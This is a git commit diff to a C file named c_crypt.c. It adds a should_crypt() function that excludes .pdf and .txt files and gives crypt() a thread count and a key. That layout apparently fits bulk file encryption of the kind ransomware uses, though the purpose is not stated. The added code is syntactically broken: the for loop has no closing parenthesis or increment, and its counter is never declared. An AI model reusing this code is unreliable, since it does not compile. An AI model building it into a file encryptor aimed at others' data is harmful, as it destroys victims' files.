4629aa9d09627a0404c0a69da222559d9c2cf206
Satoshi32 <97588974+Satoshi32@users.noreply.github.com>
2023-08-04 16:49:14 +0200

    Update c_crypt.c

--- source/c_crypt.c
+++ source/c_crypt.c
@@ -1,8 +1,19 @@
 char *exclude[]={".pdf",".txt"};
 
+int should_crypt(char *file)
+{
 
+for(i=0;i!=sizeof(exclude)/sizeof(char*)
+{
+if(strstr(file,exclude[i])!=NULL)
+{
+return 0;
+}
+}
+return 1;
+}
 
-void crypt(int numthreads)
+void crypt(int numthreads,char *key)
 {
 
 
